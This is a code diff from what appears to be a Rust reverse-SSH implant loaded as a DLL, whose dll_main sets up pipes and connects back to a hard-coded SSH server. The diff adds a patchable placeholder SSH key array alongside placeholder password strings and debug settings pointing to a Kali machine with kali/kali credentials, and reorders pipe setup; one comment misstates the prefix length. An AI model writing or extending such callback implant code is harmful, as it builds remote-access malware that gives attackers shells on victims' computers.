@@ -25,11 +25,33 @@ pub static PASSWORD_STRING: &[u8; 66] = b"PASSWORD_STRING_NO_CHANGE_PLS_PASSWORD
 
 /// Debug config
 #[cfg(debug_assertions)]
-pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.18\0\0\0\0\0\0\0\0";
+pub static SSH_IPV4_ADDRESS: &[u8; 20] = b"192.168.0.228\0\0\0\0\0\0\0";
 #[cfg(debug_assertions)]
 pub static USERNAME_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
 #[cfg(debug_assertions)]
 pub static PASSWORD_STRING: &[u8; 66] = b"kali\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
+
+pub static SSH_KEY: &[u8; 512] = &initialize_ssh_key_array();
+
+const fn initialize_ssh_key_array() -> [u8; 512] {
+    let mut key_array = [0u8; 512]; // Initialize the array with null bytes
+
+    // Your original prefix string
+    let prefix = b"SSH_KEY_NO_CHANGE_PLS\0";
+
+    // Copy the prefix into the beginning of the array
+    let mut i = 0;
+    while i < prefix.len() {
+        // This check is mostly for safety, prefix.len() (131) < key_array.len() (512)
+        if i < key_array.len() {
+            key_array[i] = prefix[i];
+        }
+        i += 1;
+    }
+    // The rest of key_array remains filled with the initial 0u8 values.
+    key_array
+}
+
 
 const SSH_PORT: u16 = 22;
 
@@ -46,15 +68,17 @@ const SSH_PORT: u16 = 22;
 #[allow(non_snake_case, unused_variables)]
 pub fn dll_main() {
 
-    let h_input_pipe = match initialize_input_pipe() {
-        None => return,
-        Some(h) => h,
-    };
+    // let ssh_key = String::from_utf8_lossy(SSH_KEY);
+    // println!("KEY:{}\nLEN:{}", ssh_key.clone(), ssh_key.len());
+
     let h_output_pipe = match initialize_output_pipe() {
         None => return,
         Some(h) => h,
     };
-
+    let h_input_pipe = match initialize_input_pipe() {
+        None => return,
+        Some(h) => h,
+    };
     // Convert the IP address bytes to string more efficiently
     let ip_address = String::from_utf8_lossy(SSH_IPV4_ADDRESS).clone().trim_end_matches(char::from(0)).to_string();
     let server_address = format!("{}:{}", ip_address, SSH_PORT);
